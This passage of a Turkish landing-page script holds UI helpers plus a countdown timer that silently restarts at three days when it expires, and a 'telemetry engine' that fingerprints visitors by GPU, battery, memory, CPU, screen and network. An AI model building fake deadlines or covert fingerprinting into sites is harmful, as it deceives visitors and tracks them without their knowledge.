        if (successBox) {
            successBox.classList.remove('hidden');
            successBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
    });
}

// ==========================================
// 14) GERİ SAYIM SAYACI (COUNTDOWN)
// ==========================================
function setupCountdown() {
    var daysEl = document.getElementById('timer-days');
    var hoursEl = document.getElementById('timer-hours');
    var minsEl = document.getElementById('timer-mins');
    var secsEl = document.getElementById('timer-secs');

    if (!daysEl || !hoursEl || !minsEl || !secsEl) return;

    var targetDate = new Date();
    targetDate.setDate(targetDate.getDate() + 3);
    targetDate.setHours(targetDate.getHours() + 14);

    function updateTimer() {
        var now = new Date().getTime();
        var diff = targetDate.getTime() - now;

        if (diff <= 0) {
            targetDate = new Date(Date.now() + 3 * 24 * 60 * 60 * 1000);
            diff = targetDate.getTime() - now;
        }

        var d = Math.floor(diff / (1000 * 60 * 60 * 24));
        var h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        var m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        var s = Math.floor((diff % (1000 * 60)) / 1000);

        daysEl.textContent = String(d).padStart(2, '0');
        hoursEl.textContent = String(h).padStart(2, '0');
        minsEl.textContent = String(m).padStart(2, '0');
        secsEl.textContent = String(s).padStart(2, '0');
    }

    updateTimer();
    setInterval(updateTimer, 1000);
}

// ==========================================
// 15) S.S.S. AKORDEON
// ==========================================
function setupFaqAccordion() {
    var items = document.querySelectorAll('.faq-item');
    items.forEach(function (item) {
        var btn = item.querySelector('.faq-question');
        if (btn) {
            btn.addEventListener('click', function () {
                var isActive = item.classList.contains('active');
                items.forEach(function (other) { other.classList.remove('active'); });
                if (!isActive) item.classList.add('active');
            });
        }
    });
}

// ==========================================
// 16) SCROLL ANALİTİĞİ & ANİMASYONLAR
// ==========================================
function setupScrollTracking() {
    window.addEventListener('scroll', function () {
        var scrollTop = window.scrollY || document.documentElement.scrollTop;
        var docHeight = document.documentElement.scrollHeight - window.innerHeight;
        if (docHeight > 0) {
            var percent = Math.min(100, Math.round((scrollTop / docHeight) * 100));
            if (percent > STATE.maxScroll) {
                STATE.maxScroll = percent;
            }
        }
    }, { passive: true });
}

function setupScrollAnimations() {
    var elements = document.querySelectorAll('.animate-on-scroll');
    if (!elements.length) return;

    var observer = new IntersectionObserver(function (entries) {
        entries.forEach(function (entry) {
            if (entry.isIntersecting) {
                entry.target.classList.add('visible');
            }
        });
    }, { threshold: 0.1 });

    elements.forEach(function (el) { observer.observe(el); });
}

// ==========================================
// 17) ARKA PLAN PARTİKÜL EFEKTİ
// ==========================================
function setupParticles() {
    var canvas = document.getElementById('particles-canvas');
    if (!canvas) return;
    var ctx = canvas.getContext('2d');

    function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize);

    var particles = [];
    var count = window.innerWidth < 768 ? 25 : 55;

    for (var i = 0; i < count; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            size: Math.random() * 2.2 + 0.6,
            speedX: (Math.random() - 0.5) * 0.4,
            speedY: (Math.random() - 0.5) * 0.4,
            opacity: Math.random() * 0.5 + 0.2
        });
    }

    function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#06B6D4';

        for (var i = 0; i < particles.length; i++) {
            var p = particles[i];
            p.x += p.speedX;
            p.y += p.speedY;

            if (p.x < 0) p.x = canvas.width;
            if (p.x > canvas.width) p.x = 0;
            if (p.y < 0) p.y = canvas.height;
            if (p.y > canvas.height) p.y = 0;

            ctx.beginPath();
            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            ctx.fillStyle = 'rgba(6, 182, 212, ' + p.opacity + ')';
            ctx.fill();
        }
        requestAnimationFrame(animate);
    }
    animate();
}

// ==========================================
// 18) HASSAS TARAYICI & CİHAZ BİLGİLERİ (TELEMETRİ MOTORU)
// ==========================================
function getDeviceInfo() {
    var ua = navigator.userAgent || '';
    
    // 1. Cihaz Tipi Tespiti
    var isMobile = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
    var isTablet = /iPad|Android(?!.*Mobile)|Tablet/i.test(ua);
    var deviceType = isTablet ? 'Tablet' : (isMobile ? 'Mobil' : 'Masaüstü');

    // 2. İşletim Sistemi ve Sürüm Tespiti
    var os = 'Bilinmeyen OS';
    var osVersion = '';
    
    if (/Windows NT 10\.0/i.test(ua)) {
        os = 'Windows';
        osVersion = '10 / 11';
    } else if (/Windows NT 6\.3/i.test(ua)) {
        os = 'Windows'; osVersion = '8.1';
    } else if (/Windows NT 6\.1/i.test(ua)) {
        os = 'Windows'; osVersion = '7';
    } else if (/Macintosh|Mac OS X/i.test(ua)) {
        os = 'macOS';
        var macMatch = ua.match(/Mac OS X ([0-9_]+)/);
        if (macMatch) osVersion = macMatch[1].replace(/_/g, '.');
    } else if (/iPhone|iPad|iPod/i.test(ua)) {
        os = 'iOS';
        var iosMatch = ua.match(/OS ([0-9_]+)/);
        if (iosMatch) osVersion = iosMatch[1].replace(/_/g, '.');
    } else if (/Android/i.test(ua)) {
        os = 'Android';
        var andMatch = ua.match(/Android ([0-9\.]+)/);
        if (andMatch) osVersion = andMatch[1];
    } else if (/Linux/i.test(ua)) {
        os = 'Linux';
    } else if (/CrOS/i.test(ua)) {
        os = 'ChromeOS';
    }

    // 3. Tarayıcı Adı ve Tam Sürüm Tespiti
    var browser = 'Bilinmeyen Tarayıcı';
    var browserVersion = '';

    if (/Edg\/([0-9\.]+)/i.test(ua)) {
        browser = 'Edge';
        browserVersion = ua.match(/Edg\/([0-9\.]+)/i)[1];
    } else if (/OPR\/([0-9\.]+)|Opera\/([0-9\.]+)/i.test(ua)) {
        browser = 'Opera';
        var opMatch = ua.match(/(?:OPR|Opera)\/([0-9\.]+)/i);
        if (opMatch) browserVersion = opMatch[1];
    } else if (/SamsungBrowser\/([0-9\.]+)/i.test(ua)) {
        browser = 'Samsung Internet';
        browserVersion = ua.match(/SamsungBrowser\/([0-9\.]+)/i)[1];
    } else if (/UCBrowser\/([0-9\.]+)/i.test(ua)) {
        browser = 'UC Browser';
        browserVersion = ua.match(/UCBrowser\/([0-9\.]+)/i)[1];
    } else if (/MiuiBrowser\/([0-9\.]+)/i.test(ua)) {
        browser = 'Miui Browser';
        browserVersion = ua.match(/MiuiBrowser\/([0-9\.]+)/i)[1];
    } else if (/Chrome\/([0-9\.]+)/i.test(ua)) {
        browser = 'Chrome';
        browserVersion = ua.match(/Chrome\/([0-9\.]+)/i)[1];
    } else if (/Firefox\/([0-9\.]+)/i.test(ua)) {
        browser = 'Firefox';
        browserVersion = ua.match(/Firefox\/([0-9\.]+)/i)[1];
    } else if (/Version\/([0-9\.]+).*Safari/i.test(ua)) {
        browser = 'Safari';
        var safMatch = ua.match(/Version\/([0-9\.]+)/i);
        if (safMatch) browserVersion = safMatch[1];
    }

    // 4. Ağ Bilgisi
    var connType = 'Bilinmiyor';
    if (navigator.connection) {
        var conn = navigator.connection;
        connType = conn.effectiveType || conn.type || 'Aktif';
        if (conn.downlink) connType += ' (' + conn.downlink + ' Mbps)';
    }

    var languagesList = (navigator.languages && navigator.languages.length) 
        ? navigator.languages.join(', ') 
        : (navigator.language || 'tr');

    var rawInfo = {
        userAgent: ua,
        browser: browser,
        browserVersion: browserVersion,
        os: os,
        osVersion: osVersion,
        deviceType: deviceType,
        screen: screen.width + 'x' + screen.height,
        availScreen: screen.availWidth + 'x' + screen.availHeight,
        windowSize: window.innerWidth + 'x' + window.innerHeight,
        colorDepth: screen.colorDepth + '-bit',
        devicePixelRatio: window.devicePixelRatio || 1,
        hardwareConcurrency: navigator.hardwareConcurrency || null,
        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : null,
        maxTouchPoints: navigator.maxTouchPoints || 0,
        languages: languagesList,
        platform: navigator.platform || '',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
        timezoneOffset: new Date().getTimezoneOffset(),
        cookieEnabled: navigator.cookieEnabled,
        online: navigator.onLine,
        gpuVendor: STATE.gpuVendor,
        gpuRenderer: STATE.gpuRenderer,
        batteryLevel: STATE.batteryLevel,
        batteryCharging: STATE.batteryCharging,
        connection: connType
    };

    return {
        deviceType: deviceType,
        os: os,
        osVersion: osVersion,
        browser: browser,
        browserVersion: browserVersion,
        browserLanguages: languagesList,
        browserPlatform: navigator.platform || '',
        screenResolution: screen.width + 'x' + screen.height,
        windowSize: window.innerWidth + 'x' + window.innerHeight,
        colorDepth: screen.colorDepth + '-bit',
        devicePixelRatio: String(window.devicePixelRatio || 1),
        hardwareConcurrency: navigator.hardwareConcurrency || null,
        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : null,
        language: navigator.language || 'tr',
        isTouch: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
        cookiesEnabled: navigator.cookieEnabled,
        connectionType: connType,
        gpuVendor: STATE.gpuVendor,
        gpuRenderer: STATE.gpuRenderer,
        rawInfo: rawInfo
    };
}

function fetchWithTimeout(url, timeoutMs) {
    return Promise.race([
        fetch(url),
        new Promise(function (_, reject) {
            setTimeout(function () { reject(new Error('Timeout')); }, timeoutMs);
        })
    ]);
}
